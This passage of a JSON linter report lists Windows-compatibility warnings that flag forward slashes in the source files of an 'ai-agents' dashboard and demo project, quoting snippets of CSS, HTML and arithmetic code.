        "warning": "Line 432: Forward slash in path - \"/api/network\"",
        "timestamp": "2025-09-05T17:30:42.149883"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 437: Forward slash in path - \"/api/metrics\"",
        "timestamp": "2025-09-05T17:30:42.149896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 442: Forward slash in path - \"/api/events\"",
        "timestamp": "2025-09-05T17:30:42.149909"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 447: Forward slash in path - \"/api/market\"",
        "timestamp": "2025-09-05T17:30:42.149922"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 453: Forward slash in path - \"/ws\"",
        "timestamp": "2025-09-05T17:30:42.149936"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 36: Forward slash in path - \"\n<style>\n    .main-header {\n        background: linear-gradient(90deg, #1e3c72 0%, #2a5298 100%);\n        color: white;\n        padding: 20px;\n        margin: -20px -20px 20px -20px;\n        border-radius: 10px;\n        text-align: center;\n    }\n    \n    .metric-card {\n        background: white;\n        padding: 20px;\n        border-radius: 10px;\n        box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n        border-left: 4px solid #2a5298;\n        margin: 10px 0;\n    }\n    \n    .success-metric {\n        border-left-color: #28a745;\n    }\n    \n    .warning-metric {\n        border-left-color: #ffc107;\n    }\n    \n    .danger-metric {\n        border-left-color: #dc3545;\n    }\n    \n    .info-metric {\n        border-left-color: #17a2b8;\n    }\n    \n    .status-indicator {\n        display: inline-block;\n        width: 12px;\n        height: 12px;\n        border-radius: 50%;\n        margin-right: 8px;\n    }\n    \n    .status-healthy { background-color: #28a745; }\n    .status-warning { background-color: #ffc107; }\n    .status-critical { background-color: #dc3545; }\n    \n    .dashboard-section {\n        margin: 30px 0;\n        padding: 20px;\n        background: #f8f9fa;\n        border-radius: 10px;\n    }\n    \n    .sidebar .sidebar-content {\n        background: linear-gradient(180deg, #f8f9fa 0%, #e9ecef 100%);\n    }\n</style>\n\"",
        "timestamp": "2025-09-05T17:30:42.150737"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 197: Forward slash in path - \">\n            <h1>🚀 Enterprise Document Processing Dashboard</h1>\n            <p>Real-time Business Intelligence • Multi-Domain AI Platform • 99.5% Cost Reduction Achievement</p>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.150830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 277: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.150881"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 282: Forward slash in path - \"⚡ Throughput/Hour\"",
        "timestamp": "2025-09-05T17:30:42.150894"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 286: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.150907"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 295: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.150923"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 305: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.150940"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 379: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.150992"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 397: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.151012"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 408: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.151043"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 426: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.151068"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Line 443: Forward slash in path - '</div>'",
        "timestamp": "2025-09-05T17:30:42.151089"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\run_dashboard.py",
        "warning": "Line 31: Forward slash in path - 't exist\n    logs_dir = dashboard_dir / '",
        "timestamp": "2025-09-05T17:30:42.151419"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\run_dashboard.py",
        "warning": "Line 75: Forward slash in path - \"\n    \n    try:\n        main_dashboard = dashboard_dir / '",
        "timestamp": "2025-09-05T17:30:42.151447"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 179: Forward slash in path - ': len(active_agents) / len(agents) if agents else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.151961"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 260: Forward slash in path - '])**2\n        )\n        distance_factor = max(0.1, 1.0 - (distance / 20.0))\n        \n        # Performance compatibility\n        perf1, perf2 = agent1['",
        "timestamp": "2025-09-05T17:30:42.152025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 266: Forward slash in path - ']) / 100.0\n        perf_factor = max(0.3, 1.0 - perf_diff)\n        \n        # Collaboration preference\n        collab1 = agent1['",
        "timestamp": "2025-09-05T17:30:42.152037"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 271: Forward slash in path - ', 0.5)\n        collab_factor = (collab1 + collab2) / 2.0\n        \n        # Combine factors\n        final_score = (base_compatibility * 0.4 + \n                      distance_factor * 0.2 + \n                      perf_factor * 0.2 + \n                      collab_factor * 0.2)\n        \n        return min(1.0, max(0.1, final_score + self.np_random.normal(0, 0.1)))\n    \n    def _select_connection_type(self, source_agent: Dict, target_agent: Dict) -> str:\n        \"",
        "timestamp": "2025-09-05T17:30:42.152055"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 308: Forward slash in path - ']]\n                base_utilization = profile.utilization_patterns[current_hour]\n                \n                # Simulate various metrics with realistic correlations\n                utilization = max(5, min(100, base_utilization + self.np_random.normal(0, 8)))\n                \n                # Throughput correlates with utilization but has diminishing returns\n                utilization_factor = min(1.0, utilization / 80.0)\n                throughput = (profile.base_throughput[0] + \n                             (profile.base_throughput[1] - profile.base_throughput[0]) * utilization_factor +\n                             self.np_random.normal(0, 5))\n                \n                # Accuracy slightly decreases under very high utilization\n                accuracy_penalty = max(0, (utilization - 85) * 0.1) if utilization > 85 else 0\n                accuracy = (profile.base_accuracy[0] + \n                           (profile.base_accuracy[1] - profile.base_accuracy[0]) * self.np_random.uniform(0.8, 1.0) -\n                           accuracy_penalty + self.np_random.normal(0, 0.5))\n                \n                # Response time increases with utilization\n                response_multiplier = 1.0 + (utilization / 100.0) * 0.5\n                response_time = (profile.response_time_range[0] * response_multiplier + \n                               self.np_random.exponential(profile.response_time_range[1] * 0.3))\n                \n                # Generate metrics for each measurement type\n                metric_types = [\n                    ('",
        "timestamp": "2025-09-05T17:30:42.152100"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 333: Forward slash in path - 'ops/sec'",
        "timestamp": "2025-09-05T17:30:42.152111"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 406: Forward slash in path - '] / 100.0\n            volatility_factor = 1.0 / market_condition['",
        "timestamp": "2025-09-05T17:30:42.152171"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 407: Forward slash in path - ']\n            confidence = min(0.95, max(0.3, base_confidence * volatility_factor + self.np_random.normal(0, 0.1)))\n            \n            # Generate profit/loss for buy/sell events\n            profit = None\n            if event_type in ['",
        "timestamp": "2025-09-05T17:30:42.152186"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 415: Forward slash in path - '] * self.np_random.normal(0, 0.1)\n                return_rate = expected_return + volatility_adjustment\n                \n                quantity = self.random.randint(10, 1000)\n                profit = quantity * base_price * return_rate\n            \n            # Outcome probabilities based on confidence\n            outcome_probs = [\n                max(0.1, confidence - 0.1),  # success\n                min(0.3, 0.4 - confidence),  # failure\n                0.3  # pending\n            ]\n            outcome_probs = [p / sum(outcome_probs) for p in outcome_probs]  # normalize\n            \n            outcome = self.random.choices(['",
        "timestamp": "2025-09-05T17:30:42.152209"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 482: Forward slash in path - \"\n        market_data = []\n        start_time = datetime.now() - timedelta(hours=duration_hours)\n        \n        # Initialize base prices for each symbol\n        base_prices = {symbol: self.random.uniform(100, 500) for symbol in self.market_symbols}\n        \n        # Generate data points every 5 minutes\n        for minute in range(0, duration_hours * 60, 5):\n            timestamp = start_time + timedelta(minutes=minute)\n            \n            for symbol in self.market_symbols:\n                # Simulate price movement using random walk with trend\n                current_price = base_prices[symbol]\n                \n                # Add some market-wide correlation\n                market_sentiment = self.np_random.normal(0, 0.005)  # Overall market trend\n                individual_movement = self.np_random.normal(0, 0.02)  # Individual stock movement\n                \n                # Price change\n                price_change = market_sentiment + individual_movement\n                new_price = current_price * (1 + price_change)\n                base_prices[symbol] = max(10, new_price)  # Prevent negative prices\n                \n                # Calculate percentage change\n                change_percent = (new_price - current_price) / current_price * 100\n                \n                # Generate volume (higher during market hours)\n                hour = timestamp.hour\n                if 9 <= hour <= 16:  # Market hours\n                    base_volume = self.random.randint(500000, 5000000)\n                else:\n                    base_volume = self.random.randint(50000, 500000)\n                \n                # Volume spikes with large price movements\n                volume_multiplier = 1 + abs(change_percent) * 0.5\n                volume = int(base_volume * volume_multiplier)\n                \n                # Technical indicators\n                rsi = max(0, min(100, 50 + self.np_random.normal(0, 20)))\n                macd = self.np_random.normal(0, 2)\n                \n                bollinger_middle = new_price\n                bollinger_std = new_price * 0.02\n                bollinger_upper = bollinger_middle + (2 * bollinger_std)\n                bollinger_lower = bollinger_middle - (2 * bollinger_std)\n                \n                # Sentiment score (-1 to 1)\n                sentiment = np.tanh(change_percent * 0.1 + self.np_random.normal(0, 0.3))\n                \n                market_point = {\n                    '",
        "timestamp": "2025-09-05T17:30:42.152284"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 555: Forward slash in path - \"\n        output_dir = Path(__file__).parent / '",
        "timestamp": "2025-09-05T17:30:42.152313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\data\\synthetic_data_generator.py",
        "warning": "Line 556: Forward slash in path - '\n        output_dir.mkdir(exist_ok=True)\n        \n        filepath = output_dir / f'",
        "timestamp": "2025-09-05T17:30:42.152329"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 128: Forward slash in path - \"\n        history = []\n        base_date = datetime.now() - timedelta(days=30)\n        \n        for i in range(30 * 24):  # 30 days of hourly data\n            timestamp = base_date + timedelta(hours=i)\n            \n            # Simulate performance metrics with trends and variance\n            base_performance = 0.85 + (i * 0.0001)  # Gradual improvement\n            daily_cycle = 0.05 * math.sin(2 * math.pi * i / 24)  # Daily performance cycle\n            weekly_cycle = 0.02 * math.sin(2 * math.pi * i / (24 * 7))  # Weekly cycle\n            noise = random.uniform(-0.02, 0.02)\n            \n            performance = base_performance + daily_cycle + weekly_cycle + noise\n            performance = max(0.8, min(0.99, performance))  # Clamp values\n            \n            history.append({\n                \"",
        "timestamp": "2025-09-05T17:30:42.153048"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 195: Forward slash in path - ']}</b><br>\"",
        "timestamp": "2025-09-05T17:30:42.153097"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 219: Forward slash in path - '%{text}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153128"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 339: Forward slash in path - '%{text}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153211"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 353: Forward slash in path - 'Global Best<br>Fitness: {global_best_fitness:.2f}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153237"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 442: Forward slash in path - ']}/hr\"",
        "timestamp": "2025-09-05T17:30:42.153309"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 466: Forward slash in path - \"])\n        \n        # Errors from various stages\n        error_stages = [1, 2, 3, 4, 5]  # Classification, OCR, Extraction, Validation, Integration\n        for stage_idx in error_stages:\n            stage_errors = errors // len(error_stages)\n            source_indices.append(stage_idx)\n            target_indices.append(len(stages))  # Errors node\n            values.append(stage_errors)\n            link_colors.append('",
        "timestamp": "2025-09-05T17:30:42.153348"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 510: Forward slash in path - '%{source.label} → %{target.label}<br>Volume: %{value} docs/hr<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153395"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 535: Forward slash in path - \"] for a in type_agents])\n            \n            for hour in hours:\n                # Add daily cycle and some noise\n                daily_factor = 0.9 + 0.1 * np.sin(2 * np.pi * (hour - 6) / 24)  # Peak at 12 PM\n                hourly_perf = base_performance * daily_factor + random.uniform(-0.02, 0.02)\n                hourly_performance.append(max(0.8, min(1.0, hourly_perf)))\n            \n            performance_matrix.append(hourly_performance)\n        \n        fig = go.Figure(data=go.Heatmap(\n            z=performance_matrix,\n            x=[f\"",
        "timestamp": "2025-09-05T17:30:42.153441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 551: Forward slash in path - 'Agent Type: %{y}<br>Time: %{x}<br>Performance: %{z:.1%}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153471"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 734: Forward slash in path - '<b>%{{y}}</b><br>%{{text}}<br>Agents: {event[\"",
        "timestamp": "2025-09-05T17:30:42.153593"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 734: Forward slash in path - \"]}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.153632"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 758: Forward slash in path - \"\n    <style>\n    .agent-header {\n        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n        padding: 2rem;\n        border-radius: 10px;\n        color: white;\n        text-align: center;\n        margin-bottom: 2rem;\n    }\n    .agent-metric {\n        background: white;\n        padding: 1rem;\n        border-radius: 10px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n        text-align: center;\n    }\n    .status-indicator {\n        display: inline-block;\n        width: 12px;\n        height: 12px;\n        border-radius: 50%;\n        margin-right: 5px;\n    }\n    .status-active { background-color: #00b894; }\n    .status-processing { background-color: #fdcb6e; }\n    .status-competing { background-color: #ff6b35; }\n    .status-collaborating { background-color: #74b9ff; }\n    </style>\n    \"",
        "timestamp": "2025-09-05T17:30:42.153678"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 791: Forward slash in path - \">\n        <h1>🤖 AI Agent Network Visualization</h1>\n        <h3>Real-Time 3D Agent Swarm Intelligence</h3>\n        <p>Interactive visualization of multi-agent coordination and emergent behaviors</p>\n    </div>\n    \"",
        "timestamp": "2025-09-05T17:30:42.153713"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 814: Forward slash in path - \"{active_agents/total_agents:.1%}\"",
        "timestamp": "2025-09-05T17:30:42.153750"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 873: Forward slash in path - \"] /= agent_types[agent_type][\"",
        "timestamp": "2025-09-05T17:30:42.153808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 880: Forward slash in path - \"]) for a in agents)\n        avg_connections = total_connections / len(agents)\n        st.text(f\"",
        "timestamp": "2025-09-05T17:30:42.153844"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 883: Forward slash in path - \"Avg Connections/Agent: {avg_connections:.1f}\"",
        "timestamp": "2025-09-05T17:30:42.153875"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 884: Forward slash in path - \"Network Density: {total_connections / (len(agents) * (len(agents) - 1)):.3f}\"",
        "timestamp": "2025-09-05T17:30:42.153907"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 898: Forward slash in path - \"\n        }\n        \n        for status, count in status_counts.items():\n            percentage = count / len(agents) * 100\n            st.markdown(f'",
        "timestamp": "2025-09-05T17:30:42.153945"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 903: Forward slash in path - \"></span>{status.title()}: {count} ({percentage:.1f}%)'",
        "timestamp": "2025-09-05T17:30:42.153977"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 917: Forward slash in path - \"🎮 **Interactive Controls**: Use the Play/Pause buttons and slider below the chart to control the animation\"",
        "timestamp": "2025-09-05T17:30:42.154017"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 971: Forward slash in path - \"] / stages[i][\"",
        "timestamp": "2025-09-05T17:30:42.154080"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 978: Forward slash in path - ']}/hr\"",
        "timestamp": "2025-09-05T17:30:42.154117"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 994: Forward slash in path - \"] / stage[\"",
        "timestamp": "2025-09-05T17:30:42.154157"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\agent_visualization.py",
        "warning": "Line 1007: Forward slash in path - ']} docs/hr\"",
        "timestamp": "2025-09-05T17:30:42.154198"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 290: Forward slash in path - \"] / 60  # Convert to minutes\n        ]\n        \n        fig = make_subplots(\n            rows=1, cols=2,\n            subplot_titles=['",
        "timestamp": "2025-09-05T17:30:42.154960"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 332: Forward slash in path - \"Documents/Minute\"",
        "timestamp": "2025-09-05T17:30:42.154996"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 377: Forward slash in path - 'Cost/Doc'",
        "timestamp": "2025-09-05T17:30:42.155048"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 379: Forward slash in path - '\n            ),\n            row=1, col=1\n        )\n        \n        # 5-year TCO\n        fig.add_trace(\n            go.Bar(\n                x=solutions,\n                y=[cost / 1000000 for cost in five_year_costs],  # Convert to millions\n                marker_color=colors,\n                name='",
        "timestamp": "2025-09-05T17:30:42.155073"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 391: Forward slash in path - \"${cost/1000000:.1f}M\"",
        "timestamp": "2025-09-05T17:30:42.155092"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 399: Forward slash in path - \"] / 1000  # Convert to thousands\n            for solution in [\"",
        "timestamp": "2025-09-05T17:30:42.155114"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 417: Forward slash in path - \"] / 1000  # Convert to thousands\n            for solution in [\"",
        "timestamp": "2025-09-05T17:30:42.155140"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 534: Forward slash in path - \"Documents/Minute\"",
        "timestamp": "2025-09-05T17:30:42.155210"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 600: Forward slash in path - \"].values()))\n        ])\n        \n        accuracy_improvement = ((our_avg_accuracy - comp_avg_accuracy) / comp_avg_accuracy) * 100\n        \n        our_speed = data[\"",
        "timestamp": "2025-09-05T17:30:42.155266"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 608: Forward slash in path - \"]\n        ])\n        \n        speed_improvement = ((our_speed - comp_avg_speed) / comp_avg_speed) * 100\n        \n        our_cost = data[\"",
        "timestamp": "2025-09-05T17:30:42.155297"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 616: Forward slash in path - \"]\n        ])\n        \n        cost_reduction = ((comp_avg_cost - our_cost) / comp_avg_cost) * 100\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.155327"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 625: Forward slash in path - \": (accuracy_improvement + speed_improvement + cost_reduction) / 3\n        }\n\ndef create_benchmark_dashboard():\n    \"",
        "timestamp": "2025-09-05T17:30:42.155357"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 637: Forward slash in path - \"\n    <style>\n    .benchmark-header {\n        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n        padding: 2rem;\n        border-radius: 10px;\n        color: white;\n        text-align: center;\n        margin-bottom: 2rem;\n    }\n    .metric-container {\n        background: white;\n        padding: 1.5rem;\n        border-radius: 10px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n        border: 2px solid #667eea;\n        text-align: center;\n    }\n    .improvement-badge {\n        background: linear-gradient(135deg, #00b894 0%, #55a3ff 100%);\n        color: white;\n        padding: 0.5rem 1rem;\n        border-radius: 20px;\n        font-weight: bold;\n        display: inline-block;\n        margin: 0.5rem;\n    }\n    </style>\n    \"",
        "timestamp": "2025-09-05T17:30:42.155391"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 669: Forward slash in path - \">\n        <h1>🏆 AI Document Intelligence Benchmark Showcase</h1>\n        <h3>Comprehensive Performance Analysis & Competitive Comparison</h3>\n        <p>Demonstrating Superior Performance Across All Key Metrics</p>\n    </div>\n    \"",
        "timestamp": "2025-09-05T17:30:42.155421"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 687: Forward slash in path - \">\n            <h3>🎯 Accuracy</h3>\n            <h2>96.2%</h2>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.155451"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 690: Forward slash in path - ']:.1f}% vs Competition</div>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.155475"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 696: Forward slash in path - \">\n            <h3>⚡ Speed</h3>\n            <h2>150 docs/min</h2>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.155503"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 699: Forward slash in path - ']:.0f}% vs Competition</div>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.155527"
      },
      {
        "category": "WINDOWS_COMPAT",
